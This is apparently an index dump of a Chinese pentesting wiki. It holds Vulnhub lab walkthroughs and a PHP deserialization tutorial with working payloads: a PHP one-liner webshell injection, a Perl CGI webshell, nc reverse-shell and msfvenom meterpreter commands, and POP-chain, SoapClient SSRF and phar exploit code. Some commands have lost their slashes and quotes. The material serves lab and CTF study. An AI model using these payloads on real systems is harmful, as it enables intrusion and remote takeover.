unserialize($aaa);$c-not_exists_function();?"},{"path":"/wiki/WP/Windows提权/vulnhub/GeminiInc v1.html","content":"前提 kali 192.168.129.152 靶机 NAT模式 信息收集ip检测 nmap -sP 192.168.129.024 ip 为 192.168.129.166 端口检测nmap -sT -sV -Pn 192.168.129.166 -p- -A 只开放了22,80 渗透测试提权"},{"path":"/wiki/WP/Windows提权/vulnhub/Kioptrix 2014 (#5).html","content":"前提kali ip 192.168.129.152信息收集ip收集nmap -sP 192.168.129.024 端口收集nmap -sT -sV -Pn -v 192.168.129.164 -p- -A 扫描到 22，80，8080， 但是22端口关闭了 看看udp 端口 nmap -sU -p- 192.168.129.164 无 渗透测试80端口 检查源代码 访问 ehole扫描指纹 Apache,FreeBSD,mod_ssl,mod_dav, | Apache2.2.21 (FreeBSD) mod_ssl2.2.21 OpenSSL0.9.8q DAV2 PHP5.3.8 扫秒是否有漏洞 查看内容目录穿越http://192.168.129.164/pChart2.1.3/examples/index.php?Action=ViewScript=%2f..%2f..%2fetc/passwd 有三个用户，但都不能登录，尝试内核漏洞 etcshadow 没有权限 可以查看apache的配置http://192.168.129.164/pChart2.1.3/examples/index.php?Action=ViewScript=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf 只允许Mozilla4_browser 替换一下 使用这个插件，自定义 User-Agent :Mozilla4.0 但是感觉不太好用，默认的话，浏览器不能用 还是用BP吧 搜一下是什么，大概是cms 有msf模块，直接用 失败 翻看别人笔记，原来是没有设置payload 最重要的一点，没有设置ua show advanced 可以查看详细内容 手工尝试 exploitdb 显示 可以有两个方法 尝试输入一句话木马 http://192.168.129.164:8080/phptax/drawimage.php?pfilez=xxx;echo%20%27%3C?php%20echo%20system($_GET[%22cmd%22])%20?%3E%27%20%3E%202.php;pdfmake 看看成功没有 可以执行命令了，不知道为什么，连接蚁剑连不上 蚁剑连不上原因:得用适用合适的一句话木马这样才能连上 xsshttp://192.168.129.164/pChart2.1.3/examples/sandbox/script/session.php?%3Cscript%3Ealert(%27XSS%27)%3C/script%3E 但对提权作用不大 8080端口 禁止访问 权限提升搜索漏洞 searchsploit FreeBSD 9.0 28718.c没有成功，尝试263这个 系统里只有nc 和gcc kali 发送文件 nc -lvp 555526368.c客户机接受文件 nc 192.168.129.152 5555 111.c编译，执行 获取信息 总结 第一次用searchsploit 不太熟练，还得多用，英文还得好好看 中国蚁剑连接问题 ：得用相应木马，不然连不上蚁剑"},{"path":"/wiki/WP/反序列化/php/php反序列化.html","content":"PHP反序列化这一篇就够了简介序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。 在网上找到一个比较形象的例子 比如：现在我们都会在淘宝上买桌子，桌子这种很不规则的东西，该怎么从一个城市运输到另一个城市，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。 php 将数据序列化和反序列化会用到两个函数 serialize 将对象格式化成有序的字符串 unserialize 将字符串还原成原来的对象 序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。 常见的序列化格式了解即可 二进制格式 字节数组 json字符串 xml字符串 案例引入简单的例子(以数组为例子) ?php$user=array(xiao,shi,zi);$user=serialize($user);echo($user.PHP_EOL);print_r(unserialize($user)); 他会输出 a:3:i:0;s:4:xiao;i:1;s:3:shi;i:2;s:2:zi;Array( [0] = xiao [1] = shi [2] = zi) 我们对上面这个例子做个简单讲解，方便大家入门 a:3:i:0;s:4:xiao;i:1;s:3:shi;i:2;s:2:zi;a:array代表是数组，后面的3说明有三个属性i:代表是整型数据int，后面的0是数组下标s:代表是字符串，后面的4是因为xiao长度为4 依次类推 序列化后的内容只有成员变量，没有成员函数，比如下面的例子 ?phpclass test public $a; public $b; function __construct()$this-a = xiaoshizi;$this-b=laoshizi; function happy()return $this-a;$a = new test();echo serialize($a);? 输出(O代表Object是对象的意思，也是类) O:4:test:2:s:1:a;s:9:xiaoshizi;s:1:b;s:8:laoshizi; 而如果变量前是protected，则会在变量名前加上\\x00*\\x00,private则会在变量名前加上\\x00类名\\x00,输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式，如下： ?phpclass test protected $a; private $b; function __construct()$this-a = xiaoshizi;$this-b=laoshizi; function happy()return $this-a;$a = new test();echo serialize($a);echo urlencode(serialize($a));? 输出则会导致不可见字符\\x00的丢失 O:4:test:2:s:4: * a;s:9:xiaoshizi;s:7: test b;s:8:laoshizi; 反序列化中常见的魔术方法__wakeup() //执行unserialize()时，先会调用这个函数__sleep() //执行serialize()时，先会调用这个函数__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当尝试将对象调用为函数时触发 反序列化绕过小Trickphp7.1+反序列化对类属性不敏感我们前面说了如果变量前是protected，序列化结果会在变量名前加上\\x00*\\x00 但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有\\x00*\\x00也依然会输出abc ?phpclass test protected $a; public function __construct() $this-a = abc; public function __destruct() echo $this-a; unserialize(O:4:test:1:s:1:a;s:3:abc;); 绕过__wakeup(CVE-2016-7124) 版本： PHP5 5.6.25 PHP7 7.0.10 利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 对于下面这样一个自定义类 ?phpclass test public $a; public function __construct() $this-a = abc; public function __wakeup() $this-a=666; public function __destruct() echo $this-a; 如果执行unserialize(O:4:test:1:{s:1:a;s:3:abc;});输出结果为666 而把对象属性个数的值增大执行unserialize(O:4:test:2:{s:1:a;s:3:abc;});输出结果为abc 绕过部分正则preg_match(/^O:\\d+/)匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点 利用加号绕过（注意在url里传参时+要编码为%2B） serialize(array($ a)); $a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构) ?phpclass test public $a; public function __construct() $this-a = abc; public function __destruct() echo $this-a.PHP_EOL; function match($data) if (preg_match(/^O:\\d+/,$data)) die(you lose!); else return $data; $a = O:4:test:1:s:1:a;s:3:abc;;// +号绕过$b = str_replace(O:4,O:+4, $a);unserialize(match($b));// serialize(array($a));unserialize(a:1:i:0;O:4:test:1:s:1:a;s:3:abc;); 利用引用?phpclass test public $a; public $b; public function __construct() $this-a = abc; $this-b= $this-a; public function __destruct() if($this-a===$this-b) echo 666; $a = serialize(new test()); 上面这个例子将$b设置为$a的引用，可以使$a永远与$b相等 16进制绕过字符的过滤O:4:test:2:s:4:%00*%00a;s:3:abc;s:7:%00test%00b;s:3:def;可以写成O:4:test:2:S:4:\\00*\\00\\61;s:3:abc;s:7:%00test%00b;s:3:def;表示字符类型的s大写时，会被当成16进制解析。 我这里写了一个例子 ?phpclass test public $username; public function __construct() $this-username = admin; public function __destruct() echo 666; function check($data) if(stristr($data, username)!==False) echo(你绕不过！！.PHP_EOL); else return $data; // 未作处理前$a = O:4:test:1:s:8:username;s:5:admin;;$a = check($a);unserialize($a);// 做处理后 \\75是u的16进制$a = O:4:test:1:S:8:\\\\75sername;s:5:admin;;$a = check($a);unserialize($a); PHP反序列化字符逃逸情况1：过滤后字符变多首先给出本地的php代码，很简单不做过多的解释，就是把反序列化后的一个x替换成为两个 ?phpfunction change($str) return str_replace(x,xx,$str);$name = $_GET[name];$age = I am 11;$arr = array($name,$age);echo 反序列化字符串：;var_dump(serialize($arr));echo br/;echo 过滤后:;$old = change(serialize($arr));$new = unserialize($old);var_dump($new);echo br/此时，age=$new[1]; 正常情况,传入name=mao 如果此时多传入一个x的话会怎样，毫无疑问反序列化失败，由于溢出(s本来是4结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸 首先来看看结果，再来讲解 我们传入name=maoxxxxxxxxxxxxxxxxxxxx;i:1;s:6:woaini;};i:1;s:6:woaini;}这一部分一共二十个字符由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符;i:1;s:6:woaini;}，从而造成;i:1;s:6:woaini;}的溢出，而闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出woaini最后的;}闭合反序列化全过程导致原来的;i:1;s:7:I am 11;}被舍弃，不影响反序列化过程 情况2：过滤后字符变少老规矩先上代码,很简单不做过多的解释，就是把反序列化后的两个x替换成为一个 ?phpfunction change($str) return str_replace(xx,x,$str);$arr[name] = $_GET[name];$arr[age] = $_GET[age];echo 反序列化字符串：;var_dump(serialize($arr));echo br/;echo 过滤后:;$old = change(serialize($arr));var_dump($old);echo br/;$new = unserialize($old);var_dump($new);echo br/此时，age=;echo $new[age]; 正常情况传入name=maoage=11的结果 老规矩看看最后构造的结果，再继续讲解 简单来说，就是前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码；我们来看，这部分是age序列化后的结果 s:3:age;s:28:11;s:3:age;s:6:woaini;} 由于前面是40个x所以导致少了20个字符，所以需要后面来补上，;s:3:age;s:28:11这一部分刚好20个，后面由于有闭合了前面因此后面的参数就可以由我们自定义执行了 对象注入当用户的请求在传给反序列化函数unserialize()之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的unserialize函数，最终导致一个在该应用范围内的任意PHP对象注入。 对象漏洞出现得满足两个前提 1、unserialize的参数可控。2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。 比如这个例子 ?phpclass A var $test = y4mao; function __destruct() echo $this-test; $a = O:1:A:1:s:4:test;s:5:maomi;;unserialize($a); 在脚本运行结束后便会调用_destruct函数，同时会覆盖test变量输出maomi POP链的构造利用POP链简单介绍前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来 简单案例讲解首先看看简单的MRCTF2020-Ezpop,不带大家一一读代码了，自己解决 ?phpclass Modifier protected $var; public function append($value) include($value); public function __invoke() $this-append($this-var); class Show public $source; public $str; public function __construct($file=index.php) $this-source = $file; echo Welcome to .$this-source.br; public function __toString() return $this-str-source; public function __wakeup() if(preg_match(/gopher|http|file|ftp|https|dict|\\.\\./i, $this-source)) echo hacker; $this-source = index.php; class Test public $p; public function __construct() $this-p = array(); public function __get($key) $function = $this-p; return $function(); 这里我直接说利用思路，首先逆向分析，我们最终是希望通过Modifier当中的append方法实现本地文件包含读取文件，回溯到调用它的__invoke，当我们将对象调用为函数时触发,发现在Test类当中的__get方法，再回溯到Show当中的__toString，再回溯到Show当中的__construct当中有echo $this-source可以调用__toString 因此不难构造pop链 ?phpini_set(memory_limit,-1);class Modifier protected $var = php://filter/read=convert.base64-encode/resource=flag.php;class Show public $source; public $str; public function __construct($file) $this-source = $file; $this-str = new Test(); class Test public $p; public function __construct() $this-p = new Modifier(); $a = new Show(aaa);$a = new Show($a);echo urlencode(serialize($a)); PHP原生类反序列化利用SoapClient介绍 综述： php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。 必须调用SoapClient不存在的方法，触发SoapClient的__call魔术方法。 通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容 SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用__call方法，具体详细的信息大家可以去搜索引擎看看，这里不再赘述 利用方式下面首先在我的VPS上面开启监听nc -lvvp 9328 ?php$a = new SoapClient(null,array(uri=bbb, location=http://xxxx.xxx.xx:9328));$b = serialize($a);$c = unserialize($b);$c - not_a_function();//调用不存在的方法，让SoapClient调用__call 运行上面的php程序，在我的vps上面奖会捕获监听 从上面这张图可以看到，SOAPAction处是我们的可控参数，因此我们可以尝试注入我们自己恶意构造的CRLF即插入**\\r **，利用成功！ 但是还有个问题我们再发送POST数据的时候是需要遵循HTTP协议，指定请求头Content-Type: applicationx-www-form-urlencoded但Content-Type在SOAPAction的上面，就无法控制Content-Type,也就不能控制POST的数据 接下来我们实验一下 实战反序列化我们传入的vip执行getFlag函数(迷惑人的函数) ?phphighlight_file(__FILE__);$vip = unserialize($_GET[vip]);$vip-getFlag();//flag.php$xff = explode(,, $_SERVER[HTTP_X_FORWARDED_FOR]);array_pop($xff);$ip = array_pop($xff);​​if($ip!==127.0.0.1) die(error);else $token = $_POST[token]; if($token==ctfshow) file_put_contents(flag.txt,$flag); 由于服务器带有cloudfare代理，我们无法通过本地构造XFF头实现绕过，我们需要使用SoapClient与CRLF实现SSRF访问127.0.0.1/flag.php,即可绕过cloudfare代理 ?php$target = http://127.0.0.1/flag.php;$post_string = token=ctfshow;$headers = array( X-Forwarded-For: 127.0.0.1,127.0.0.1, UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d);$b = new SoapClient(null,array(location = $target,user_agent=y4tacker^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string,uri = aaab));$aaa = serialize($b);$aaa = str_replace(^^,\\r ,$aaa);$aaa = str_replace(,,$aaa);echo urlencode($aaa); 接下来访问flag.txt即可 Phar反序列化phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。 什么是phar文件在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发 php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar:就是一种内置的流包装器。 php中一些常见的流包装器如下： file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 phar文件的结构stub:phar文件的标志，必须以 xxx __HALT_COMPILER();? 结尾，否则无法识别。xxx可以为自定义内容。manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。content:被压缩文件的内容signature (可空):签名，放在末尾。 如何生成一个phar文件？下面给出一个参考例子 ?php class Test @unlink(phar.phar); $phar = new Phar(phar.phar); //后缀名必须为phar $phar-startBuffering(); $phar-setStub(?php __HALT_COMPILER(); ?); //设置stub $o = new Test(); $phar-setMetadata($o); //将自定义的meta-data存入manifest $phar-addFromString(test.txt, test); //添加要压缩的文件 //签名自动计算 $phar-stopBuffering();? 漏洞利用条件 phar文件要能够上传到服务器端。 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 受影响的函数知道创宇测试后受影响的函数列表： 实际上不止这些，也可以参考这篇链接，里面有详细说明https://blog.zsxsoft.com/post/38 当然为了阅读方便，这里便把它整理过来 //exifexif_thumbnailexif_imagetype //gdimageloadfontimagecreatefrom***系列函数 //hash hash_hmac_filehash_filehash_update_filemd5_filesha1_file // file/urlget_meta_tagsget_headers //standard getimagesizegetimagesizefromstring // zip $zip = new ZipArchive();$res = $zip-open(c.zip);$zip-extractTo(phar://test.phar/test);// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过$z = compress.bzip2://phar:///home/sx/test.phar/test.txt;$z = compress.zlib://phar:///home/sx/test.phar/test.txt;//配合其他协议：(SUCTF)//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d///当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。//php://filter/read=convert.base64-encode/resource=phar://phar.phar//Postgres pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。?php $pdo = new PDO(sprintf(pgsql:host=%s;dbname=%s;user=%s;password=%s, 127.0.0.1, postgres, sx, 123456)); @$pdo-pgsqlCopyFromFile(aa, phar://phar.phar/aa);? // Mysql//LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper//配置一下mysqld://[mysqld]//local-infile=1//secure_file_priv= ?phpclass A public $s = ; public function __wakeup () system($this-s); $m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, localhost, root, root, testtable, 3306);$p = mysqli_query($m, LOAD DATA LOCAL INFILE \\phar://test.phar/test\\ INTO TABLE a LINES TERMINATED BY \\\\r \\ IGNORE 1 LINES;);? 绕过方式当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://等绕过 compress.bzip://phar:///test.phar/test.txtcompress.bzip2://phar:///test.phar/test.txtcompress.zlib://phar:///home/sx/test.phar/test.txtphp://filter/resource=phar:///test.phar/test.txt 当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。php:filterreadconvert.base64-encoderesourcephar:phar.phar GIF格式验证可以通过在文件头部添加GIF89a绕过1、$phar-setStub(“GIF89a”.””); 设置stub2、生成一个phar.phar，修改后缀名为phar.gif php-session反序列化session简单介绍在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。 当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。 session 的存储机制php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。存储的文件是以sess_sessionid来进行命名的 php_serialize 经过serialize()函数序列化数组 php 键名+竖线+经过serialize()函数处理的值 php_binary 键名的长度对应的ascii字符+键名+serialize()函数序列化的值 php.ini中一些session配置 session.save_path”” –设置session的存储路径session.save_handler””–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)session.auto_start boolen–指定会话模块是否在请求开始时启动一个会话默认为0不启动session.serialize_handler string–定义用来序列化反序列化的处理器名字。默认使用php 利用姿势session.upload_progress进行文件包含和反序列化渗透这篇文章说的很详细了，没必要班门弄斧 https://www.freebuf.com/vuls/202819.html 使用不同的引擎来处理session文件$_SESSION变量直接可控php引擎的存储格式是键名|serialized_string，而php_serialize引擎的存储格式是serialized_string。如果程序使用两个引擎来分别处理的话就会出现问题 来看看这两个php // 1.php?phpini_set(session.serialize_handler, php_serialize);session_start();$_SESSION[y4] = $_GET[a];var_dump($_SESSION);//2.php?phpini_set(session.serialize_handler, php);session_start();class test public $name; function __wakeup() echo $this-name; 首先访问1.php，传入参数a=|O:4:test:1:{s:4:name;s:8:y4tacker;}再访问2.php，注意不要忘记| 由于1.php是使用php_serialize引擎处理，因此只会把|当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到|时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对|后的值进行反序列化处理。 这里可能会有一个小疑问，为什么在解析session文件时直接对|后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明： 当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量 因此我们成功触发了test类中的__wakeup()方法,所以这种攻击思路是可行的。但这种方法是在可以对session的进行赋值的，那如果代码中不存在对$_SESSION变量赋值的情况下又该如何利用 $_SESSION变量直接不可控我们来看高校战疫的一道CTF题目 ?php//A webshell is wait for youini_set(session.serialize_handler, php);session_start();class OowoO public $mdzz; function __construct() $this-mdzz = phpinfo();; function __destruct() eval($this-mdzz); if(isset($_GET[phpinfo])) $m = new OowoO();else highlight_string(file_get_contents(index.php));? 我们注意到这样一句话ini_set(session.serialize_handler, php);，因此不难猜测本身在php.ini当中的设置可能是php_serialize，在查看了phpinfo后得证猜测正确，也知道了这道题的考点 那么我们就进入phpinfo查看一下，enabledon表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；只需往该地址任意 POST 一个名为 PHP_SESSION_UPLOAD_PROGRESS 的字段，就可以将filename的值赋值到session中 构造文件上传的表单 form action=http://web.jarvisoj.com:32784/index.php method=POST enctype=multipart/form-data input type=hidden name=777 / input type=file name=file / input type=submit //form 接下来构造序列化payload ?phpini_set(session.serialize_handler, php_serialize);session_start();class OowoO public $mdzz=print_r(scandir(dirname(__FILE__)));;$obj = new OowoO();echo serialize($obj);? 由于采用Burp发包，为防止双引号被转义，在双引号前加上\\，除此之外还要加上| 在这个页面随便上传一个文件，然后抓包修改filename的值 可以看到Here_1s_7he_fl4g_buT_You_Cannot_see.php这个文件，flag肯定在里面，但还有一个问题就是不知道这个路径，路径的问题就需要回到phpinfo页面去查看 因此我们只需要把payload，当中改为print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));即可获取flag ?phpini_set(session.serialize_handler, php_serialize);session_start();class OowoO public $mdzz=print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));;$obj = new OowoO();echo serialize($obj);? 参考文章https://xz.aliyun.com/t/2715 https://xz.aliyun.com/t/2613 https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf https://blog.csdn.net/qq_43431158articledetails99544797 https://www.cnblogs.com/or4nge/p/13439974.html https://blog.zsxsoft.com/post/38 https://paper.seebug.org/680/ https://www.freebuf.com/articles/web/182231.html https://www.freebuf.com/vuls/202819.html"},{"path":"/wiki/WP/Windows提权/vulnhub/devrandom Scream.html","content":"前提kali IP 192.168.129.152 windows xp 设置成NAT模式 信息收集扫描ipnmap -sP 192.168.129.024 目标应该就是 192.168.129.163了 扫描端口 masscan 192.168.129.163 -p1-65535 –rate 100000 扫出来 21，22，23，80端口 nmap -sT -sV -Pn -v 192.168.129.163 -p 21,22,23,80 FTPnmap -sT -sV -Pn -v 192.168.129.163 -p 21,22,23,80 -A 尝试匿名登录应该是下面提权那块，改服务导致连不上ftp 表明可能正在运行 TFTP 服务 扫描udpnmap -sU -p- 192.168.129.163 tftp 192.163.129.163 put文件，在浏览器访问，看是否成功 网页被我搞挂掉了 但确实能访问成功 然后通过ftp匿名登录，可以看到有一个cgi-bin,可以尝试上传这类木马 ssh 渗透测试cgi-bin解释CGI 代表 通用网关接口。”Bin” 是 binary（二进制） 的缩写 - 经常用来指代可执行文件或脚本。 cgi-bin 目录是网站开发者放置可执行文件的地方，这样他们的网站就能拥有比纯 HTML 更多的功能。 主流的CGI程序用Perl编写 上传perl 木马,虽然界面乱码，但不影响使用#!/usr/bin/perluse strict;use warnings;use CGI;use Cwd;print CGI::header(-type = text/html);my $query = new CGI;my $command = $query-param(command) || ;my $pwd = $query-param(pwd) || ;my $password = $query-param(password)|| ;my $filename = $query-script_name();# 密码验证if ($password ne yourpassword) print 请提供有效的密码 ; exit(0);# 处理当前目录$pwd = `pwd` unless $pwd;chomp($pwd); # 移除末尾换行符eval chdir($pwd) ;my $result = ;# 执行命令if ($command =~ /^cd\\s+(.+)$/) my $new_dir = $1; eval chdir($new_dir) ; $pwd = Cwd::cwd(); $result = `ls -la 21`; elsif ($command =~ /^cd\\s*$/) chdir($ENVHOME); $pwd = Cwd::cwd(); $result = `ls -la 21`; elsif ($command) $result = `$command 21`;# HTML输出print qq!DOCTYPE htmlhtmlheadmeta charset=utf-8title网页控制台/titlescriptwindow.onload = function() document.getElementById(command).focus();;/scriptstyle type=text/css.wide1 border: 2px solid #ccc; width: 98%; height: 400px; font-family: monospace; padding: 10px;.wide2 border: 2px solid #ccc; width: 70%; padding: 5px;.container margin: 20px;.info background-color: #f0f0f0; padding: 10px; margin-bottom: 10px;/style/headbodydiv class=container div class=info 脚本: $filename | 当前目录: $pwd /div pre class=wide1$result/pre form method=post action=$filename name=cmdForm label for=command命令:/label input class=wide2 name=command id=command autocomplete=off input type=submit value=执行 brbr input name=password value=$password type=hidden input name=pwd value=$pwd type=hidden /form/div/body/html;exit 0; 权限提升反弹shell1.PowerCat.ps1(失败)靶机是 Windows XP 精简版 或者 老 IIS 环境，系统目录里 没有 powershell.exe 2.nc.exetftp 上传32位nc.exe wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip unzip netcat-win32-1.11.zip cd netcat-1.11 tftp 192.168.129.163 binary 必须将传输模式切换为font style=color:#DF2A3F;background-color:rgb(249, 242, 244);binary/font，否则TFTP会上传纯文本 put nc.exe cgi-binnc.exe 网页端查看是否上传成功 成功上传 kali监听nc -lvp 5555 网页端执行命令nc -nv 192.168.129.152 5555 -e C:\\Windows\\System32\\cmd.exe 3.msf生成木马文件msfvenom -p windoesmeterpreterreverse_tcp LHOST192.168.129.152 LPORT5555 -f exe -o shell.exe tftp上传到windows xpput shell.exe cgi-binshell.exe msf 监听端口use exploitmultihandler set payload windowsmeterpreterreverse_tcp set lport 5555 set lhost 192.168.129.152 网页端运行start .\\shell.exe 内核提权msf自动查找利用之前反弹的shellbg(把会话放进后端) use postmultireconlocal_exploit_suggester(全自动) set session 2 (因为反弹的shell提示会话是2) run 查找可利用的点，绿色的都可以试试use exploitwindowslocalms10_015_kitrap0d set session 2 set lhost 192.168.129.152 set lport 6666 msf 另外开个窗口监听 run 下面好几个都可以用，有一个就可以 手工(所有自动方法不行的话，最后再手工，提高效率)错误的系统配置工具传送 winpeas ，accesschktftp put winPEASx86.exe cgi-binwinPEASx86.exe 先nc反弹shell winPEAS检查服务配置错误.\\winPEASx86.exe quiet servicesinfo 卡住了，应该是系统太老了，跳过 msf前提:先有一个反弹shelluse exploitwindowslocalservice_permissionsset session 1 另外一个msf窗口监听 失败，换一个 use exploitwindowslocalunquoted_service_path 失败 手工查看系统进程tasklist FI “username eq SYSTEM” 这几个都是系统进程，尝试能不能停止进程 查看服务net start 选这个是因为不影响系统服务 net stop “FileZilla Server FTP server” 成功，然后查找服务路径cd C:\\ dir “FileZilla Server FTP server” s b 进入目录，通过tftp binary模式上传msf生成的木马，然后上传到对应目录msfvenom -p windoesmeterpreterreverse_tcp LHOST192.168.129.152 LPORT4444 -f exe -o xx.exe 先停止服务，然后把对应文件备份，把木马换成对应文件语法 move ““ ““ 注意 msf 生成的木马，得分情况能不能用nc反弹shell Payload 类型 能否用 NC 接收 备注 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);linux/x86/shell_reverse_tcp/font ✅ Yes 标准 reverse shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);windows/shell_reverse_tcp/font ✅ Yes Windows cmd shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);java/shell_reverse_tcp/font ✅ Yes Java reverse shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);php/reverse_php/font ✅ Yes PHP reverse shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);meterpreter/reverse_tcp/font ❌ No 需要 MSF handler font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);staged/*/font ❌ No 需要 stager font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);bind_tcp/font variants ✅ Yes 需主动连接目标 启动服务前，msf先监听窗口启动服务 还是进程迁移一下，不然会断 组策略postwindowsgathercredentialsgppset session 1 失败 令牌窃取直接尝试 getsystem成功 获取密码"},{"path":"/wiki/WP/反序列化/php/知识点.html","content":"魔术方法__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发 常规漏洞__WAKEUP将在序列化之后立即被调用,当序列化字符串表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行。 